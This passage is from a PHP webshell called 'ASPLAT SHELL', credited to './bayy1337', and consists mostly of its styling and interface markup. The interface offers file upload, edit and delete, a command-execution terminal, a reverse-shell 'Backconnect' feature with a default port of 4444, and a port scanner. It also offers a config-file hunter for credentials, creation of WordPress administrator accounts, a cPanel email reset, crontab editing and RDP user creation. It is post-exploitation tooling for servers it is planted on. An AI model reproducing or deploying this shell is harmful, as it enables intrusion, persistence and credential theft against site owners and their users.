            border-radius: 5px;
        }
        
        .nano-header {
            background: #34495e;
            padding: 10px;
            border-bottom: 1px solid #2c3e50;
            font-family: 'Roboto Mono', monospace;
            margin-bottom: 10px;
            color: #ecf0f1;
            font-size: 13px;
            border-radius: 5px 5px 0 0;
        }
        
        .tab-container {
            margin-bottom: 20px;
        }
        
        .tab-buttons {
            display: flex;
            border-bottom: 2px solid var(--border-color);
            flex-wrap: wrap;
            background: var(--card-bg);
            border-radius: 10px 10px 0 0;
            padding: 5px 5px 0 5px;
            box-shadow: var(--shadow);
        }
        
        .tab-button {
            padding: 12px 24px;
            background: transparent;
            border: none;
            cursor: pointer;
            margin-right: 5px;
            border-radius: 5px 5px 0 0;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            color: var(--text-secondary);
            transition: var(--transition);
            position: relative;
        }
        
        .tab-button.active {
            background: var(--card-bg);
            color: var(--primary);
            font-weight: 600;
        }
        
        .tab-button.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 3px;
            background: var(--secondary);
            border-radius: 3px 3px 0 0;
        }
        
        .tab-button:hover {
            background: rgba(52, 152, 219, 0.1);
            color: var(--secondary);
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            border: none;
            background: var(--card-bg);
            border-radius: 0 0 10px 10px;
            box-shadow: var(--shadow);
        }
        
        .tab-content.active {
            display: block;
        }
        
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            margin: 10px 0;
        }
        
        .command-history {
            background: #ecf0f1;
            border: 1px solid #bdc3c7;
            border-radius: 5px;
            padding: 5px;
            margin-bottom: 10px;
            font-size: 12px;
            max-height: 100px;
            overflow-y: auto;
        }
        
        .command-item {
            padding: 2px 5px;
            cursor: pointer;
            border-radius: 3px;
            transition: var(--transition);
        }
        
        .command-item:hover {
            background: #d5dbdb;
        }
        
        .loading {
            opacity: 0.6;
            pointer-events: none;
        }
        
        .terminal-prompt {
            color: var(--success);
            font-weight: bold;
        }
        
        .terminal-output-line {
            margin: 2px 0;
        }
        
        .webshell-item {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 5px;
            padding: 10px;
            margin: 5px 0;
            transition: var(--transition);
        }
        
        .webshell-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .config-item {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 5px;
            padding: 10px;
            margin: 5px 0;
            transition: var(--transition);
        }
        
        .config-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .code-preview {
            background: #2b2b2b;
            color: #f8f8f2;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
            margin: 10px 0;
        }
        
        .sidebar-logo {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .sidebar-logo h2 {
            color: white;
            font-size: 22px;
            margin-bottom: 5px;
        }
        
        .sidebar-logo p {
            color: rgba(255,255,255,0.7);
            font-size: 12px;
        }
        
        .sidebar-section {
            margin-bottom: 25px;
        }
        
        .sidebar-section h4 {
            color: white;
            margin-bottom: 12px;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .sidebar-section h4 i {
            color: var(--secondary);
        }
        
        .sidebar-buttons {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .sidebar-btn {
            background: rgba(255,255,255,0.1);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            text-align: left;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 13px;
        }
        
        .sidebar-btn:hover {
            background: rgba(255,255,255,0.2);
            transform: translateX(5px);
        }
        
        .sidebar-btn i {
            width: 20px;
            text-align: center;
        }
        
        .info-row {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
            min-height: 20px;
        }
        
        .info-label {
            width: 140px;
            flex-shrink: 0;
            font-weight: 600;
            color: var(--primary);
        }
        
        .info-value {
            flex: 1;
            word-break: break-all;
            color: var(--text-secondary);
            font-weight: normal;
        }
        
        .image-container {
            width: 100%;
            height: 80px; 
            border-radius: 5px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .full-size-image {
            width: 100%;
            height: 100%;
            object-fit: cover; 
            display: block;
        }
        
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-online {
            background: var(--success);
        }
        
        .status-offline {
            background: var(--accent);
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: var(--shadow);
            transition: var(--transition);
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
        }
        
        .card-header {
            display: flex;
            justify-content: between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .card-title {
            font-weight: 600;
            color: var(--primary);
            margin: 0;
        }
        
        .writable-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-left: 5px;
        }
        
        .writable-true {
            background: var(--success);
        }
        
        .writable-false {
            background: var(--accent);
        }
        
        .file-details {
            display: flex;
            flex-direction: column;
            gap: 2px;
            font-size: 11px;
            color: var(--text-secondary);
            margin-left: 10px;
        }
        
        .file-detail-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .file-permission {
            font-family: 'Roboto Mono', monospace;
            background: #e9ecef;
            padding: 1px 4px;
            border-radius: 3px;
            font-size: 10px;
        }
        
        .current-dir-info {
            background: var(--card-bg);
            padding: 10px 15px;
            border-radius: 5px;
            margin-bottom: 15px;
            box-shadow: var(--shadow);
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .dir-status {
            display: flex;
            align-items: center;
            gap: 5px;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 500;
        }
        
        .dir-writable {
            background: #d4edda;
            color: #155724;
        }
        
        .dir-readonly {
            background: #f8d7da;
            color: #721c24;
        }

        .context-menu {
            display: none;
            position: absolute;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 1000;
            min-width: 180px;
            overflow: hidden;
        }

        .context-menu-item {
            padding: 10px 15px;
            cursor: pointer;
            border-bottom: 1px solid #f0f0f0;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
        }

        .context-menu-item:hover {
            background: #f8f9fa;
        }

        .context-menu-item:last-child {
            border-bottom: none;
        }

        .context-menu-item.danger {
            color: var(--accent);
        }

        .selection-count {
            background: var(--secondary);
            color: white;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            margin-left: 5px;
        }

        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .sidebar {
                width: 100%;
                height: auto;
                position: relative;
            }
            .file-item {
                flex-direction: column;
                align-items: flex-start;
            }
            .file-actions {
                margin-top: 10px;
                width: 100%;
            }
            .file-info {
                margin-left: 0px;
                margin-top: 5px;
            }
            .tab-buttons {
                flex-direction: column;
            }
            .tab-button {
                margin-right: 0;
                margin-bottom: 5px;
                border-radius: 5px;
            }
            .tab-button.active::after {
                display: none;
            }
            .breadcrumb {
                flex-direction: column;
                align-items: flex-start;
            }
            .home-btn {
                margin-left: 0;
                margin-top: 10px;
            }
        }

        .bkk {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 10px;
            transition: background-color 0.3s;
            width: 100%;
        }

        .bkk:hover {
            background-color: #45a049;
        }

        .bkk:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .icon {
            margin-right: 5px;
        }
    </style>
</head>
<body>
<div class="container">
    <!-- Sidebar -->
    <div class="sidebar">
        <div class="sidebar-logo">
            <div class="image-container">
                <img src="https://a.top4top.io/p_356308my91.gif" alt="Animated GIF" class="full-size-image">
            </div>
            <div>
                <h2><i class="fas fa-terminal"></i> ASPLAT SHELL</h2>
                <div class="header-icons">
                    <a href="https://github.com/Bayyzp" target="_blank" class="header-icon" title="GitHub">
                        <i class="fab fa-github"></i>
                    </a>
                    <a href="https://t.me/s4nec4" target="_blank" class="header-icon" title="Telegram">
                        <i class="fab fa-telegram"></i>
                    </a>
                    <a href="https://github.com/Bayyzp" target="_blank" class="header-icon" title="Website">
                        <i class="fas fa-globe"></i>
                    </a>
                    <p>Made By ./bayy1337</p>
                </div>
            </div>
        </div>

        <style>
        .bkk {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 10px;
            transition: background-color 0.3s;
            width: 100%;
        }

        .bkk:hover {
            background-color: #45a049;
        }

        .bkk:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .icon {
            margin-right: 5px;
        }
        </style>

        <audio id="myAudio" controls autoplay loop style="display: none;">
            <source src="https://g.top4top.io/m_3564lilxx0.mp3" type="audio/mpeg">
        </audio>

        <button class="bkk" id="playBtn" onclick="playAudio()">
            <span class="icon">▶</span> Play
        </button>

        <script>
        const audio = document.getElementById("myAudio");
        const playBtn = document.getElementById("playBtn");

        function playAudio() {
            if (audio.paused) {
                audio.play();
                playBtn.innerHTML = '<span class="icon">⏸</span> Jeda Musik';
            } else {
                audio.pause();
                playBtn.innerHTML = '<span class="icon">▶</span> Putar Musik';
            }
        }

        audio.addEventListener('ended', function() {
            playBtn.innerHTML = '<span class="icon">▶</span> Putar Musik';
        });
        </script>
        
        <!-- Session Info Section -->
        <div class="sidebar-section">
            <h4><i class="fas fa-user-shield"></i> Session Info</h4>
            <div class="sidebar-buttons">
                <div class="sidebar-btn" style="background: rgba(52, 152, 219, 0.2);">
                    <i class="fas fa-user"></i> 
                    <div>
                        <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong>
                        <div style="font-size: 11px; opacity: 0.8;">
                            Login: <?php echo date('H:i:s', $_SESSION['login_time']); ?>
                        </div>
                    </div>
                </div>
                <a href="?logout=true" class="sidebar-btn" style="background: rgba(231, 76, 60, 0.2); color: #e74c3c;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
        <div class="sidebar-section">
            <h4><i class="fas fa-folder-open"></i> Quick Navigation</h4>
            <div class="sidebar-buttons">
                <a href="?dir=<?php echo urlencode($home_dir); ?>" class="sidebar-btn">
                    <i class="fas fa-home"></i> Home Directory
                </a>
                <a href="?dir=/" class="sidebar-btn">
                    <i class="fas fa-hdd"></i> Root Directory
                </a>
                <a href="?dir=/etc" class="sidebar-btn">
                    <i class="fas fa-cogs"></i> /etc
                </a>
                <a href="?dir=/tmp" class="sidebar-btn">
                    <i class="fas fa-temp"></i> /tmp
                </a>
                <a href="?dir=/var/www" class="sidebar-btn">
                    <i class="fas fa-globe"></i> /var/www
                </a>
            </div>
        </div>
        
        <div class="sidebar-section">
            <h4><i class="fas fa-tools"></i> Advanced Tools</h4>
            <div class="sidebar-buttons">
                <button onclick="showWpUser()" class="sidebar-btn">
                    <i class="fas fa-user-plus"></i> Add WP User
                </button>
                <button onclick="showPortScanner()" class="sidebar-btn">
                    <i class="fas fa-network-wired"></i> Port Scanner
                </button>
                <button onclick="showWebshellScanner()" class="sidebar-btn">
                    <i class="fas fa-shield-alt"></i> Webshell Scanner
                </button>
                <button onclick="showBackconnect()" class="sidebar-btn">
                    <i class="fas fa-plug"></i> Backconnect
                </button>
                <button onclick="showConfigHunter()" class="sidebar-btn">
                    <i class="fas fa-search"></i> Config Hunter
                </button>
                <button onclick="showCpanelReset()" class="sidebar-btn">
                    <i class="fas fa-sync"></i> Reset cPanel
                </button>
                <button onclick="showCrontabManager()" class="sidebar-btn">
                    <i class="fas fa-clock"></i> Manage Crontab
                </button>
                <button onclick="showRdpManager()" class="sidebar-btn">
                    <i class="fas fa-desktop"></i> RDP Manager
                </button>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main">

        <!-- System Info -->
        <div class="system-info">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <div style="display: flex; flex-wrap: wrap; gap: 20px;">
                    <div class="info-row">
                        <span class="info-label"><i class="fas fa-user"></i> <strong>User:</strong></span>
                        <span class="info-value"><?php echo @get_current_user(); ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label"><i class="fas fa-code"></i> <strong>PHP Version:</strong></span>
                        <span class="info-value"><?php echo phpversion(); ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label"><i class="fas fa-server"></i> <strong>Server Software:</strong></span>
                        <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?></span>
                    </div>
                </div>
                <div class="login-info">
                    <i class="fas fa-user-circle"></i>
                    <?php echo htmlspecialchars($_SESSION['username']); ?>
                    <a href="?logout=true" class="logout-btn">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </a>
                </div>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-desktop"></i> <strong>Hostname:</strong></span>
                <span class="info-value"><?php echo php_uname('n'); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-microchip"></i> <strong>Kernel Version:</strong></span>
                <span class="info-value"><?php echo php_uname('v'); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-network-wired"></i> <strong>Server IP:</strong></span>
                <span class="info-value"><?php echo $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?? 'N/A'; ?></span>
            </div>
        </div>

        <!-- Breadcrumb -->
        <div class="breadcrumb">
            <div class="dir-status <?php echo is_writable_dir($current_dir) ? 'dir-writable' : 'dir-readonly'; ?>">
                <i class="fas <?php echo is_writable_dir($current_dir) ? 'fa-check-circle' : 'fa-exclamation-circle'; ?>"></i>
                <?php echo is_writable_dir($current_dir) ? 'Writable' : 'Read Only'; ?>
            </div>
            <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
                <strong><i class="fas fa-folder"></i> Pwd:</strong> 
                <?php
                $path_parts = [];
                $temp_path = $current_dir;
                
                while ($temp_path != '.' && $temp_path != '/') {
                    $path_parts[] = ['name' => basename($temp_path), 'path' => $temp_path];
                    $temp_path = dirname($temp_path);
                }
                $path_parts[] = ['name' => 'Root', 'path' => '.'];
                $path_parts = array_reverse($path_parts);
                
                foreach ($path_parts as $index => $part) {
                    if ($index > 0) echo ' <i class="fas fa-chevron-right" style="font-size:10px;"></i> ';
                    echo '<a href="?dir='.urlencode($part['path']).'" class="dir-link">'.htmlspecialchars($part['name']).'</a>';
                }
                ?>
            </div>
            <a href="?dir=<?php echo urlencode($home_dir); ?>" class="bayy"><i class="fas fa-home"></i> Home</a>
            <br><div style="font-size: 12px; color: var(--text-secondary);">
                <strong>Current:</strong> <?php echo realpath($current_dir); ?>
            </div>
        </div>

        <!-- Tab Container -->
        <div class="tab-container">
            <div class="tab-buttons">
                <button class="tab-button active" onclick="switchTab('fileManager')">
                    <i class="fas fa-folder"></i> File Manager
                </button>
                <button class="tab-button" onclick="switchTab('terminal')" id="terminalTabButton">
                    <i class="fas fa-terminal"></i> Terminal
                </button>
                <button class="tab-button" onclick="switchTab('crontab')">
                    <i class="fas fa-clock"></i> Crontab Manager
                </button>
            </div>
            
            <!-- File Manager Tab -->
            <div id="fileManager" class="tab-content active">
                <!-- Toolbar -->
                <div class="toolbar">
                    <button onclick="showUpload()" class="btn btn-success">
                        <i class="fas fa-upload"></i> Upload File
                    </button>
                    <button onclick="showMkdir()" class="btn btn-info">
                        <i class="fas fa-folder-plus"></i> Create Folder
                    </button>
                    <button onclick="showNewFile()" class="btn btn-warning">
                        <i class="fas fa-file-plus"></i> New File
                    </button>
                    <button onclick="showZipFiles()" class="btn btn-primary" id="zipBtn" disabled>
                        <i class="fas fa-file-archive"></i> Zip Selected (<span id="selectedCount">0</span>)
                    </button>
                    <button onclick="showUnzipFile()" class="btn btn-secondary">
                        <i class="fas fa-expand-arrows-alt"></i> Unzip File
                    </button>
                </div>

                <!-- File List -->
                <div class="section">
                    <h3 style="margin-bottom: 15px;">
                        <i class="fas fa-list"></i> Directory Contents
                    </h3>
                    
                    <div class="file-list" id="fileList">
                        <?php
                        // Parent directory link
                        if ($current_dir != '.' && $current_dir != '/') {
                            $parent = dirname($current_dir);
                            $parent_writable = is_writable_dir($parent);
                            echo '<div class="file-item">
                                <span class="file-name">
                                    <span class="icon-folder"><i class="fas fa-folder"></i></span> 
                                    <a href="?dir='.urlencode($parent).'" class="dir-link">
                                        Parent Directory
                                        ' . (!$parent_writable ? '<span class="writable-indicator writable-false" title="Read Only"></span>' : '') . '
                                    </a>
                                </span>
                                <div class="file-actions">
                                    <span class="file-info">DIR</span>
                                </div>
                            </div>';
                        }

                        $files = @scandir($current_dir);
                        if ($files) {
                            foreach ($files as $file) {
                                if ($file == '.' || $file == '..') continue;
                                
                                $fullpath = $current_dir . '/' . $file;
                                $is_dir = @is_dir($fullpath);
                                $icon = $is_dir ? '<span class="icon-folder"><i class="fas fa-folder"></i></span>' : '<span class="icon-file"><i class="fas fa-file"></i></span>';
                                $size = $is_dir ? '-' : format_size(@filesize($fullpath));
                                $perms = substr(sprintf('%o', @fileperms($fullpath)), -4);
                                $time = @date('Y-m-d H:i:s', @filemtime($fullpath));
                                $created = @date('Y-m-d H:i:s', @filectime($fullpath));
                                $is_writable = is_writable($fullpath);
                                
                                echo '<div class="file-item" data-file="'.htmlspecialchars($file).'" data-path="'.htmlspecialchars($fullpath).'" data-type="'.($is_dir ? 'dir' : 'file').'">
                                    <span class="file-name">'.$icon.' ';
                                
                                if ($is_dir) {
                                    $dir_writable = is_writable_dir($fullpath);
                                    echo '<a href="?dir='.urlencode($fullpath).'" class="dir-link">'.htmlspecialchars($file);
                                    if (!$dir_writable) {
                                        echo ' <span class="writable-indicator writable-false" title="Read Only"></span>';
                                    }
                                    echo '</a>';
                                } else {
                                    echo htmlspecialchars($file);
                                    if (!$is_writable) {
                                        echo ' <span class="writable-indicator writable-false" title="Read Only"></span>';
                                    }
                                }
                                                                            
                                echo '</span>
                                    <div class="file-details">
                                        <div class="file-detail-item">
                                            <i class="fas fa-calendar" style="font-size:9px;"></i>
                                            <span>Created: ' . $created . '</span>
                                        </div>
                                        <div class="file-detail-item">
                                            <i class="fas fa-edit" style="font-size:9px;"></i>
                                            <span>Modified: ' . $time . '</span>
                                        </div>
                                        <div class="file-detail-item">
                                            <i class="fas fa-key" style="font-size:9px;"></i>
                                            <span class="file-permission">' . $perms . '</span>
                                        </div>
                                    </div>
                                    <div class="file-actions">';
                                    
                                if (!$is_dir) {
                                    echo '<a href="?action=download&file='.urlencode($fullpath).'&dir='.urlencode($current_dir).'" class="btn btn-info" title="Download"><i class="fas fa-download"></i> Download</a>
                                          <button onclick="editFile(\''.addslashes($fullpath).'\')" class="btn btn-warning" title="Edit" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-edit"></i> Edit</button>';
                                }
                                
                                echo '<button onclick="chmodFile(\''.addslashes($fullpath).'\', \''.$perms.'\')" class="btn btn-secondary" title="Change Permissions"><i class="fas fa-key"></i> Permissions</button>
                                      <button onclick="renameFile(\''.addslashes($fullpath).'\')" class="btn btn-primary" title="Rename" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-i-cursor"></i> Rename</button>
                                      <button onclick="deleteFile(\''.addslashes($fullpath).'\')" class="btn btn-danger" title="Delete" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-trash"></i> Delete</button>
                                    </div>
                                </div>';
                            }
                        } else {
                            echo '<div class="file-item">Cannot read directory contents</div>';
                        }
                        
                        ?>
                    </div>
                </div>
            </div>
            
            <!-- Terminal Tab -->
            <div id="terminal" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">
                        <i class="fas fa-terminal"></i> System Terminal
                    </h3>
                    <div class="terminal">
                        <div class="command-history" id="commandHistory"></div>
                        <div class="terminal-output" id="terminalOutput">
                            <div style="color: #7f8c8d;">// Terminal ready. Type commands below.</div>
                        </div>
                        <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                            <input type="text" name="command" class="terminal-input" placeholder="Enter command..." id="terminalInput">
                            <button type="button" class="btn btn-success" onclick="executeCommand()" id="executeBtn">
                                <i class="fas fa-play"></i> Execute
                            </button>
                        </div>
                        <div style="display: flex; gap: 5px; flex-wrap: wrap;">
                            <button type="button" class="btn btn-secondary" onclick="clearTerminal()">
                                <i class="fas fa-broom"></i> Clear
                            </button>
                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('pwd')">pwd</button>
                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('ls -la')">ls -la</button>
                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('whoami')">whoami</button>
                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('id')">id</button>
                            <button type="button" class="btn btn-info" onclick="insertCommonCommandWithDir('ls -la')">ls -la (current dir)</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Crontab Manager Tab -->
            <div id="crontab" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">
                        <i class="fas fa-clock"></i> Crontab Manager
                    </h3>
                    <div class="terminal">
                        <div class="terminal-output" id="crontabOutput" style="height: 50px;">Loading crontab...</div>
                        <textarea id="crontabContent" style="width:100%; height:200px; margin:10px 0; font-family: 'Roboto Mono', monospace; font-size: 13px;" placeholder="Edit crontab content here..."></textarea>
                        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                            <button type="button" class="btn btn-success" onclick="saveCrontab()">
                                <i class="fas fa-save"></i> Save Crontab
                            </button>
                            <button type="button" class="btn btn-info" onclick="loadCrontab()">
                                <i class="fas fa-sync"></i> Reload
                            </button>
                            <button type="button" class="btn btn-warning" onclick="addCrontabExample()">
                                <i class="fas fa-plus"></i> Add Example
                            </button>
                            <button type="button" class="btn btn-secondary" onclick="clearCrontab()">
                                <i class="fas fa-eraser"></i> Clear
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- WordPress User Tab -->
            <div id="wpUser" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">Add WordPress User</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="wpUserOutput" style="height: 100px;"></div>
                        <form id="wpUserForm">
                            <input type="text" name="wp_config_path" placeholder="Path to wp-config.php (e.g., /var/www/html/wp-config.php)" style="margin: 10px 0;">
                            <input type="text" name="username" placeholder="Username" style="margin: 10px 0;">
                            <input type="password" name="password" placeholder="Password" style="margin: 10px 0;">
                            <input type="email" name="email" placeholder="Email" style="margin: 10px 0;">
                            <select name="role" style="margin: 10px 0;">
                                <option value="subscriber">Subscriber</option>
                                <option value="contributor">Contributor</option>
                                <option value="author">Author</option>
                                <option value="editor">Editor</option>
                                <option value="administrator">Administrator</option>
                            </select>
                            <div style="display: flex; gap: 10px; margin-top: 20px;">
                                <button type="button" class="btn btn-success" onclick="addWpUser()">Add User</button>
                                <button type="button" class="btn btn-info" onclick="findWpConfig()">Find wp-config.php</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <!-- Port Scanner Tab -->
            <div id="portScanner" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">Port Scanner</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="portScannerOutput" style="height: 300px;"></div>
                        <input type="text" id="scanHost" placeholder="Host (e.g., localhost or IP)" value="localhost" style="margin: 10px 0;">
                        <input type="text" id="scanPorts" placeholder="Ports (comma separated)" value="21,22,23,25,53,80,110,115,135,139,143,194,443,445,993,995,1433,3306,3389,5432,5900,6379,27017" style="margin: 10px 0;">
                        <div style="display: flex; gap: 10px;">
                            <button type="button" class="btn btn-success" onclick="scanPorts()">Scan Ports</button>
                            <button type="button" class="btn btn-info" onclick="quickScan()">Quick Scan</button>
                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('portScannerOutput').innerHTML = ''">Clear</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Webshell Scanner Tab -->
            <div id="webshellScanner" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">Webshell Scanner</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="webshellScannerOutput" style="height: 50px;"></div>
                        <input type="text" id="scanPath" placeholder="Path to scan (e.g., /var/www)" value="/var/www" style="margin: 10px 0;">
                        <div style="display: flex; gap: 10px;">
                            <button type="button" class="btn btn-danger" onclick="scanWebshells()">Scan for Webshells</button>
                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('webshellScannerOutput').innerHTML = ''">Clear</button>
                        </div>
                        <div id="webshellResults" style="margin-top: 20px;"></div>
                    </div>
                </div>
            </div>

            <!-- Backconnect Tab -->
            <div id="backconnect" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">Backconnect</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="backconnectOutput" style="height: 300px;"></div>
                        <input type="text" id="backconnectHost" placeholder="Your IP address" style="margin: 10px 0;">
                        <input type="text" id="backconnectPort" placeholder="Port" value="4444" style="margin: 10px 0;">
                        <div style="display: flex; gap: 10px;">
                            <button type="button" class="btn btn-success" onclick="startBackconnect()">Start Backconnect</button>
                            <button type="button" class="btn btn-info" onclick="showBackconnectHelp()">Help</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Config Hunter Tab -->
            <div id="configHunter" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">Config File Hunter</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="configHunterOutput" style="height: 50px;"></div>
                        <input type="text" id="configScanPath" placeholder="Path to scan (e.g., /var/www)" value="/var/www" style="margin: 10px 0;">
                        <div style="display: flex; gap: 10px;">
                            <button type="button" class="btn btn-info" onclick="scanConfigFiles()">Scan Config Files</button>
                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('configHunterOutput').innerHTML = ''">Clear</button>
                        </div>
                        <div id="configResults" style="margin-top: 20px;"></div>
                    </div>
                </div>
            </div>

            <!-- cPanel Reset Tab -->
            <div id="cpanelReset" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">cPanel Reset</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="cpanelResetOutput" style="height: 50px;"></div>
                        <input type="email" id="cpanelEmail" placeholder="New email address for cPanel" style="margin: 10px 0;">
                        <div style="display: flex; gap: 10px;">
                            <button type="button" class="btn btn-warning" onclick="resetCpanel()">Reset cPanel Email</button>
                            <button type="button" class="btn btn-info" onclick="showCpanelHelp()">Help</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- RDP Manager Tab -->
            <div id="rdpManager" class="tab-content">
                <div class="section">
                    <h3 style="margin-bottom: 15px;">RDP Manager (Windows Only)</h3>
                    <div class="terminal">
                        <div class="terminal-output" id="rdpManagerOutput" style="height: 100px;"></div>
                        <div style="margin: 15px 0;">
                            <h4>Add RDP User</h4>
                            <input type="text" id="rdpUsername" placeholder="Username" style="margin: 10px 0;">
                            <input type="password" id="rdpPassword" placeholder="Password" style="margin: 10px 0;">
                            <div style="display: flex; gap: 10px;">
                                <button type="button" class="btn btn-success" onclick="addRdpUser()">Add RDP User</button>
                                <button type="button" class="btn btn-warning" onclick="enableRdp()">Enable RDP</button>
                            </div>
                        </div>
                        <div style="margin: 15px 0;">
                            <h4>RDP Information</h4>
                            <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: 'Roboto Mono', monospace; font-size: 12px;">
                                <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?? 'N/A'; ?><br>
                                <strong>Default Port:</strong> 3389<br>
                                <strong>Note:</strong> This feature works only on Windows servers
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Context Menu -->
<div class="context-menu" id="contextMenu">
    <div class="context-menu-item" onclick="contextMenuAction('select')">
        <i class="fas fa-check"></i> Select
    </div>
    <div class="context-menu-item" onclick="contextMenuAction('download')">
        <i class="fas fa-download"></i> Download
    </div>
    <div class="context-menu-item" onclick="contextMenuAction('edit')">
        <i class="fas fa-edit"></i> Edit
    </div>
    <div class="context-menu-item" onclick="contextMenuAction('rename')">
        <i class="fas fa-i-cursor"></i> Rename
    </div>
    <div class="context-menu-item" onclick="contextMenuAction('chmod')">
        <i class="fas fa-key"></i> Permissions
    </div>
    <div class="context-menu-item danger" onclick="contextMenuAction('delete')">
        <i class="fas fa-trash"></i> Delete
    </div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;"><i class="fas fa-upload"></i> Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="file" name="file" style="margin: 15px 0;">
            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-upload"></i> Upload File
                </button>
                <button type="button" class="btn btn-danger" onclick="closeModal('uploadModal')">
                    <i class="fas fa-times"></i> Cancel
                </button>
            </div>
        </form>
    </div>
</div>

